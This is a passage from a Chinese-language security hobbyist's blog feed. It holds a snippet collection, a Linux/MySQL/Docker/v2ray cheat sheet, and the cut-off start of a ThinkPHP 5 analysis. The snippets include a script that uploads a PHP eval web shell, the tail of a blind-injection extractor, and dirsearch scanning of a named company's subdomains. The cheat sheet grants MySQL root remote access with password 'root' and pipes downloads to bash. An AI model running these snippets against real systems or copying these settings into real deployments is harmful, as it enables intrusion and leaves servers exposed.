high:</span><br><span class="line">            return list[high]</span><br><span class="line"></span><br><span class="line">def getFlag(length,payload):</span><br><span class="line">    result = &apos;&apos;</span><br><span class="line">    for l in range(1,length+1):</span><br><span class="line">        payload2 = payload % l</span><br><span class="line">        result += chr(getOneData(payload2,2))</span><br><span class="line">        print(result)</span><br><span class="line"></span><br><span class="line">getFlag(getOneData(payload_len),payload)</span><br></pre></td></tr></table></figure><h2 id="python上传文件"><a href="#python上传文件" class="headerlink" title="python上传文件"></a>python上传文件</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from io import BytesIO</span><br><span class="line"></span><br><span class="line">files = &#123;</span><br><span class="line">  &apos;file&apos;: BytesIO(b&apos;aaa&lt;?php eval($_POST[txt]);//&apos; + b&apos;a&apos; * 1000000)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res = requests.post(&apos;http://192.168.169.152:8088/index.php&apos;, files=files, allow_redirects=False)</span><br><span class="line">print(res.headers)</span><br></pre></td></tr></table></figure><h2 id="匹配子域名并进行库文件操作"><a href="#匹配子域名并进行库文件操作" class="headerlink" title="匹配子域名并进行库文件操作"></a>匹配子域名并进行库文件操作</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line">import pymysql</span><br><span class="line"># 程序功能：将字符串中的域名验证是否重复，再插入数据库中。</span><br><span class="line"></span><br><span class="line"># 输入：字符串，返回：匹配子域名的数组</span><br><span class="line">def getDomain(string):</span><br><span class="line">pattern = re.compile(r&quot;[\w\.]*?\.ymm56\.com|[\w\.]*?\.ymmoa\.com|[\w\.]*?\.56qq\.com|[\w\.]*?\.56qq\.cn&quot;);</span><br><span class="line">result = re.findall(pattern,string)</span><br><span class="line">return result</span><br><span class="line"></span><br><span class="line"># 输入：list，功能：将list中的数据插入到数据库</span><br><span class="line">def insertDB(l):</span><br><span class="line">conn = pymysql.connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;,&quot;tool&quot;)</span><br><span class="line">cursor = conn.cursor()</span><br><span class="line">for name in l:</span><br><span class="line">try:</span><br><span class="line">cursor.execute(&quot;insert into ymm(name) values (&apos;%s&apos;)&quot; % name)</span><br><span class="line">except:</span><br><span class="line">print(&quot;子域名重复：%s&quot; % name)</span><br><span class="line">conn.commit()</span><br><span class="line">cursor.close()</span><br><span class="line">conn.close()</span><br><span class="line"></span><br><span class="line"># 输入：表，功能：将表项子域名输出到txt文本中</span><br><span class="line">def file(table):</span><br><span class="line">conn = pymysql.connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;,&quot;tool&quot;)</span><br><span class="line">cursor = conn.cursor()</span><br><span class="line">cursor.execute(&quot;select * from %s&quot; % table)</span><br><span class="line">result = cursor.fetchall()</span><br><span class="line">string = &quot;&quot;</span><br><span class="line">for row in result:</span><br><span class="line">string += row[1] + &quot;.maodou.com&quot; + &quot;\n&quot;</span><br><span class="line">with open(&quot;./%s.txt&quot; % table,&quot;a&quot;,encoding=&apos;UTF-8&apos;) as fp:</span><br><span class="line">fp.write(string)</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">string = &apos;&apos;&apos;asdf.ymm56.com&apos;&apos;&apos;</span><br><span class="line">insertDB(getDomain(string))</span><br></pre></td></tr></table></figure><h2 id="dirsearch多线程不同域名批量查询"><a href="#dirsearch多线程不同域名批量查询" class="headerlink" title="dirsearch多线程不同域名批量查询"></a>dirsearch多线程不同域名批量查询</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import time, threading</span><br><span class="line">import random</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">def myfunction(domain):</span><br><span class="line">print(&quot;thread %s is running\n&quot; % threading.current_thread().name)</span><br><span class="line">url = &quot;http://&quot; + domain</span><br><span class="line">payload = &quot;python3 /root/tool/dirsearch/dirsearch.py -u %s -e all&gt;%s.txt&quot; % (url,domain)</span><br><span class="line">os.system(payload)</span><br><span class="line">print(&quot;thread %s is ended\n&quot; % threading.current_thread().name)</span><br><span class="line"></span><br><span class="line">with open(&quot;./ymm.txt&quot;) as fp:</span><br><span class="line">l = fp.readlines()</span><br><span class="line"></span><br><span class="line">for i in range(20,31):</span><br><span class="line">domain = l[i].strip()</span><br><span class="line">t = threading.Thread(target=myfunction,name=domain,args=(domain,)) </span><br><span class="line">t.start()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;md5验证码&quot;&gt;&lt;a href=&quot;#md5验证码&quot; class=&quot;headerlink&quot; title=&quot;md5验证码&quot;&gt;&lt;/a&gt;md5验证码&lt;/h2&gt;&lt;p&gt;python3&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;
      
    
    </summary>
    
      <category term="杂货店" scheme="http://yoursite.com/categories/%E6%9D%82%E8%B4%A7%E5%BA%97/"/>
    
    
      <category term="other" scheme="http://yoursite.com/tags/other/"/>
    
  </entry>
  
  <entry>
    <title>linux常用指令</title>
    <link href="http://yoursite.com/2019/10/11/linux%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/"/>
    <id>http://yoursite.com/2019/10/11/linux常用指令/</id>
    <published>2019-10-11T14:41:54.000Z</published>
    <updated>2019-10-11T14:41:54.882Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Mysql授权用户远程访问"><a href="#Mysql授权用户远程访问" class="headerlink" title="Mysql授权用户远程访问"></a>Mysql授权用户远程访问</h2><p>登录Mysql，执行sql语句<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use mysql;</span><br><span class="line">grant all privileges on *.* to &apos;root&apos;@&apos;%&apos; identified by &apos;root&apos; with grant option;</span><br><span class="line">flush privileges;</span><br><span class="line">quit;</span><br></pre></td></tr></table></figure></p><p>修改mysqld.cnf，默认位置在/etc/mysql/mysql.conf.d<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/mysql/mysql.conf.d/mysqld.cnf</span><br></pre></td></tr></table></figure></p><p>将bind=127.0.0.1注释掉<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service mysql restart</span><br></pre></td></tr></table></figure></p><p>重启mysql即可</p><h2 id="Mysql指令"><a href="#Mysql指令" class="headerlink" title="Mysql指令"></a>Mysql指令</h2><p>建库<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create database test</span><br></pre></td></tr></table></figure></p><p>建表<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">create table tb_dept(</span><br><span class="line">     Id int primary key auto_increment,#部门编号 整形 主键 自增长</span><br><span class="line">     Name varchar(18),#部门名称</span><br><span class="line">     description varchar(100)#描述 );</span><br></pre></td></tr></table></figure></p><p>传数据<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">load data local infile &quot;D:/test.txt&quot; into table users fields terminated by &apos;,&apos;;</span><br></pre></td></tr></table></figure></p><p>查看可写权限<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &quot;secure_file_priv&quot;;</span><br></pre></td></tr></table></figure></p><p>去重<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DELETE FROM subdomain WHERE name IN(SELECT name FROM (SELECT name FROM subdomain GROUP BY name HAVING COUNT(name) &gt; 1) a) AND id NOT IN(SELECT * FROM (SELECT MIN(id) FROM subdomain GROUP BY name HAVING COUNT(name) &gt; 1) b)</span><br></pre></td></tr></table></figure></p><p>清空表<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TRUNCATE TABLE table1</span><br></pre></td></tr></table></figure></p><h2 id="Git操作"><a href="#Git操作" class="headerlink" title="Git操作"></a>Git操作</h2><p>ssh和https抓取<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone git@github.com:k4ge/k4ge</span><br><span class="line">git clone https://github.com/k4ge/k4ge</span><br></pre></td></tr></table></figure></p><h2 id="Docker安装"><a href="#Docker安装" class="headerlink" title="Docker安装"></a>Docker安装</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt-get install docker</span><br><span class="line">apt-get install docker.io</span><br><span class="line">apt-get install docker-compose</span><br></pre></td></tr></table></figure><h2 id="Docker-compose安装"><a href="#Docker-compose安装" class="headerlink" title="Docker-compose安装"></a>Docker-compose安装</h2><p>到github，docker项目<br><a href="https://github.com/docker/compose/releases" target="_blank" rel="noopener">https://github.com/docker/compose/releases</a><br>以14.1为例<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -L https://github.com/docker/compose/releases/download/1.24.1/docker-compose-`uname -s`-`uname -m` -o /usr/local/bin/docker-compose</span><br><span class="line">chmod +x /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/local/bin/docker-compose /usr/local/bin</span><br><span class="line">chmod +x /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure><h2 id="Docker更改源"><a href="#Docker更改源" class="headerlink" title="Docker更改源"></a>Docker更改源</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gedit /etc/docker/daemon.json</span><br></pre></td></tr></table></figure><p>添加<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">&quot;registry-mirrors&quot;: [&quot;https://docker.mirrors.ustc.edu.cn/&quot;,&quot;https://hub-mirror.c.163.com&quot;,&quot;https://registry.docker-cn.com&quot;],</span><br><span class="line">&quot;insecure-registries&quot;: [&quot;10.0.0.12:5000&quot;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>重启docker<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart docker.service</span><br><span class="line">service docker restart</span><br></pre></td></tr></table></figure></p><h2 id="lnmp安装"><a href="#lnmp安装" class="headerlink" title="lnmp安装"></a>lnmp安装</h2><p>一键安装<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://soft.vpser.net/lnmp/lnmp1.6.tar.gz -cO lnmp1.6.tar.gz &amp;&amp; tar zxf lnmp1.6.tar.gz &amp;&amp; cd lnmp1.6 &amp;&amp; ./install.sh lnmp</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">nginx:</span><br><span class="line"> image: index.alauda.cn/library/nginx</span><br><span class="line"> links:</span><br><span class="line"> - phpfpm</span><br><span class="line"> ports:</span><br><span class="line"> - &quot;80:80&quot;</span><br><span class="line"> - &quot;443:443&quot;</span><br><span class="line"> volumes:</span><br><span class="line"> - /Users/chenishr/www:/usr/share/nginx/html</span><br><span class="line"> - ./nginx.conf:/etc/nginx/nginx.conf</span><br><span class="line"> - ./nginx.d:/etc/nginx/conf.d</span><br><span class="line"></span><br><span class="line">mysql:</span><br><span class="line"> image: index.alauda.cn/library/mysql</span><br><span class="line"> environment:</span><br><span class="line"> MYSQL_ROOT_PASSWORD: qazasdedc123</span><br><span class="line"> ports:</span><br><span class="line"> - &quot;3306:3306&quot;</span><br><span class="line"></span><br><span class="line">phpfpm:</span><br><span class="line"> image: index.alauda.cn/library/php:7.0-fpm</span><br><span class="line"> links:</span><br><span class="line"> - mysql</span><br><span class="line"> volumes:</span><br><span class="line"> - /Users/chenishr/www:/var/www/html</span><br><span class="line"> ports:</span><br><span class="line"> - &quot;9000:9000&quot;</span><br></pre></td></tr></table></figure><p>改端口<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/local/nginx/conf/</span><br><span class="line">vi nginx.conf</span><br><span class="line">修改listen的值</span><br></pre></td></tr></table></figure></p><p>绑定域名<br><a href="https://blog.csdn.net/grn11/article/details/77869117" target="_blank" rel="noopener">https://blog.csdn.net/grn11/article/details/77869117</a></p><h2 id="更换源"><a href="#更换源" class="headerlink" title="更换源"></a>更换源</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gedit /etc/apt/sources.list</span><br></pre></td></tr></table></figure><p>在这里找个合适的替换掉文件内容即可<br><a href="https://mirrors.tuna.tsinghua.edu.cn/help/ubuntu/" target="_blank" rel="noopener">https://mirrors.tuna.tsinghua.edu.cn/help/ubuntu/</a><br>清华源：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># 默认注释了源码镜像以提高 apt update 速度，如有需要可自行取消注释</span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial main restricted universe multiverse</span><br><span class="line"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial main restricted universe multiverse</span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-updates main restricted universe multiverse</span><br><span class="line"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-updates main restricted universe multiverse</span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-backports main restricted universe multiverse</span><br><span class="line"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-backports main restricted universe multiverse</span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-security main restricted universe multiverse</span><br><span class="line"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-security main restricted universe multiverse</span><br><span class="line"></span><br><span class="line"># 预发布软件源，不建议启用</span><br><span class="line"># deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-proposed main restricted universe multiverse</span><br><span class="line"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-proposed main restricted universe multiverse</span><br></pre></td></tr></table></figure></p><h2 id="apache启动"><a href="#apache启动" class="headerlink" title="apache启动"></a>apache启动</h2><p>安装apache<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install apache2</span><br></pre></td></tr></table></figure></p><p>安装php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install php</span><br></pre></td></tr></table></figure></p><p>配置apache与php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install libapache2-mod-php</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/apache2 start</span><br><span class="line">/etc/init.d/apache2 restart</span><br><span class="line">/etc/init.d/apache2 stop</span><br></pre></td></tr></table></figure><h2 id="linux进程"><a href="#linux进程" class="headerlink" title="linux进程"></a>linux进程</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ps -ef |grep redis</span><br><span class="line">kill -9 4394</span><br></pre></td></tr></table></figure><h2 id="mysqli"><a href="#mysqli" class="headerlink" title="mysqli"></a>mysqli</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install php7.0-mysqli php7.0-mysqlnd</span><br></pre></td></tr></table></figure><h2 id="gcc"><a href="#gcc" class="headerlink" title="gcc"></a>gcc</h2><p>编译C语言程序<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -o test test.c</span><br></pre></td></tr></table></figure></p><h2 id="v2ray安装"><a href="#v2ray安装" class="headerlink" title="v2ray安装"></a>v2ray安装</h2><p>推荐vultr硅谷，centos7.x版本<br>v2ray只支持TCP和UDP，而ping使用的是icmp协议，所以用ping测试是无效的。</p><h3 id="服务器端"><a href="#服务器端" class="headerlink" title="服务器端"></a>服务器端</h3><p>v2ray一键安装脚本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -N --no-check-certificate https://raw.githubusercontent.com/KiriKira/v2ray.fun/kiriMod/install.sh &amp;&amp; bash install.sh</span><br></pre></td></tr></table></figure></p><p>更改内核<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">yum -y install wget</span><br><span class="line"></span><br><span class="line">wget --no-check-certificate https://blog.asuhu.com/sh/ruisu.sh &amp;&amp; bash ruisu.sh</span><br></pre></td></tr></table></figure></p><p>锐速加速<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -N --no-check-certificate https://raw.githubusercontent.com/91yun/serverspeeder/master/serverspeeder-all.sh &amp;&amp; bash serverspeeder-all.sh</span><br></pre></td></tr></table></figure></p><h3 id="windows客户端"><a href="#windows客户端" class="headerlink" title="windows客户端"></a>windows客户端</h3><p>v2ray客户端<br><a href="https://github.com/v2ray/v2ray-core/releases" target="_blank" rel="noopener">https://github.com/v2ray/v2ray-core/releases</a><br><a href="https://github.com/2dust/v2rayN/releases" target="_blank" rel="noopener">https://github.com/2dust/v2rayN/releases</a><br>将v2rayN客户端合并到v2ray目录中，打开v2rayN配置参数即可。</p><h3 id="linux客户端"><a href="#linux客户端" class="headerlink" title="linux客户端"></a>linux客户端</h3><p>安装v2ray客户端<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash &lt;(curl -L -s https://install.direct/go.sh)</span><br></pre></td></tr></table></figure></p><p>不开代理速度真的有点慢，建议windows下迅雷下载拷贝过来<br><a href="https://github.com/v2ray/v2ray-core/releases" target="_blank" rel="noopener">https://github.com/v2ray/v2ray-core/releases</a></p><p>将服务器端的<code>/root/config.json</code>拷贝到客户端目录下，运行v2ray<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./v2ray</span><br><span class="line">nohup ./v2ray &gt;/dev/null 2&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure></p><p>火狐浏览器代理设置<br><img src="/img/1569145652385.png" alt=""></p><p>proxychains设置<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get install proxychains</span><br><span class="line">gedit /etc/proxychains.conf</span><br></pre></td></tr></table></figure></p><p>在最后一行添加<br><code>socks5     127.0.0.1 1080</code><br>设置别名和开机自启动见其他选项</p><h2 id="alias"><a href="#alias" class="headerlink" title="alias"></a>alias</h2><p>设置别名<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alias p=proxychains</span><br></pre></td></tr></table></figure></p><p>保存别名<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gedit ~/.bashrc</span><br></pre></td></tr></table></figure></p><p>搜寻alias<br>在末尾添加<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alias p=proxychains</span><br></pre></td></tr></table></figure></p><h2 id="设置脚本开机自启动"><a href="#设置脚本开机自启动" class="headerlink" title="设置脚本开机自启动"></a>设置脚本开机自启动</h2><p>①脚本文件必须设置为绝对路径<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vi xxx.sh</span><br><span class="line">cp xxx.sh /etc/profile.d</span><br></pre></td></tr></table></figure></p><p>注意，如果是遇到阻塞进程，将无法开机<br>②rc.local<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gedit /erc/rc.local</span><br></pre></td></tr></table></figure></p><p>在exit前添加代码</p><h2 id="nohup后台运行"><a href="#nohup后台运行" class="headerlink" title="nohup后台运行"></a>nohup后台运行</h2><p>正常，会输出日志到nohup.out<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nohup ./program</span><br></pre></td></tr></table></figure></p><p>不输出日志信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nohup ./program &gt;/dev/null 2&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure></p><h2 id="git"><a href="#git" class="headerlink" title="git"></a>git</h2><p>抓<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/k4ge/k4ge</span><br></pre></td></tr></table></figure></p><p>本地回滚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git</span><br></pre></td></tr></table></figure></p><h2 id="composer"><a href="#composer" class="headerlink" title="composer"></a>composer</h2><p>安装<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php -r &quot;copy(&apos;https://install.phpcomposer.com/installer&apos;, &apos;composer-setup.php&apos;);&quot;</span><br><span class="line">php composer-setup.php</span><br></pre></td></tr></table></figure></p><h2 id="go"><a href="#go" class="headerlink" title="go"></a>go</h2><p>卸载已经安装的go<br><code>apt-get remove golang-go</code><br>安装go1.10<br><code>wget https://dl.google.com/go/go1.10.linux-amd64.tar.gz</code><br>解压<br><code>sudo tar zxvf go1.10.linux-amd64.tar.gz -C /usr/local</code><br>配置环境变量<br><code>gedit ~/.bashrc</code><br>添加<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">export GOROOT=/usr/local/go</span><br><span class="line">export GOPATH=/home/taoyx/program_develop/go_demo</span><br><span class="line">export PATH=$PATH:$GOPATH:/usr/local/go/bin</span><br></pre></td></tr></table></figure></p><p>保存生效<br><code>source ~/.bashrc</code><br>检查版本和环境变量<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">go version</span><br><span class="line">go env</span><br></pre></td></tr></table></figure></p><p>测试go程序<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd ~/program_develop/go_demo/src/hello</span><br><span class="line">go build hello.go</span><br><span class="line">./hello</span><br></pre></td></tr></table></figure></p><p>go脚本文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"> </span><br><span class="line">import &quot;fmt&quot;</span><br><span class="line"> </span><br><span class="line">func main() &#123;</span><br><span class="line">fmt.Printf(&quot;hello world\n&quot;)</span><br><span class="line">&#125;</span><br><span class="line">`</span><br></pre></td></tr></table></figure></p><p>编译运行go文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">go build hello.go</span><br><span class="line">./hello</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Mysql授权用户远程访问&quot;&gt;&lt;a href=&quot;#Mysql授权用户远程访问&quot; class=&quot;headerlink&quot; title=&quot;Mysql授权用户远程访问&quot;&gt;&lt;/a&gt;Mysql授权用户远程访问&lt;/h2&gt;&lt;p&gt;登录Mysql，执行sql语句&lt;br&gt;&lt;figure
      
    
    </summary>
    
      <category term="杂货店" scheme="http://yoursite.com/categories/%E6%9D%82%E8%B4%A7%E5%BA%97/"/>
    
    
      <category term="other" scheme="http://yoursite.com/tags/other/"/>
    
  </entry>
  
  <entry>
    <title>thinkphp5.x 框架分析</title>
    <link href="http://yoursite.com/2019/10/07/thinkphp5.x%20%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90/"/>
    <id>http://yoursite.com/2019/10/07/thinkphp5.x 框架分析/</id>
    <published>2019-10-07T15:43:30.000Z</published>
    <updated>2019-10-07T15:43:30.241Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>最近在n1ctf遇到thinkphp的利用链挖掘，以及上学期很火的rce漏洞，都需要对tp5框架流程有一个清晰的认识。可能记得有些杂，主要是作为个人笔记使用。</p><h2 id="二、小知识点"><a href="#二、小知识点" class="headerlink" title="二、小知识点"></a>二、小知识点</h2><h3 id="2-1-自动加载"><a href="#2-1-自动加载" class="headerlink" title="2.1.自动加载"></a>2.1.自动加载</h3><p>主要是利用<code>spl_autoload_register</code>函数，该函数是用来注册自动加载函数。什么是自动加载函数呢，就是当我们调用一个不存在的类，如<code>new person()</code>时，就会自动调用这个自动加载函数，并且把类名<code>person</code>传入该函数中，我们就可以通过自动加载函数来包含指定文件来获得该类。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line">spl_autoload_register(&quot;autoload&quot;);</span><br><span class="line">function autoload($class) &#123;</span><br><span class="line">echo $class;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">new person;</span><br><span class="line">//输出person</span><br></pre></td></tr></table></figure></p><h3 id="2-2-符号"><a href="#2-2-符号" class="headerlink" title="2.2.符号?:"></a>2.2.符号<code>?:</code></h3><p>当参数==false时，就会为后一个值，否则就为本身。<br><figure 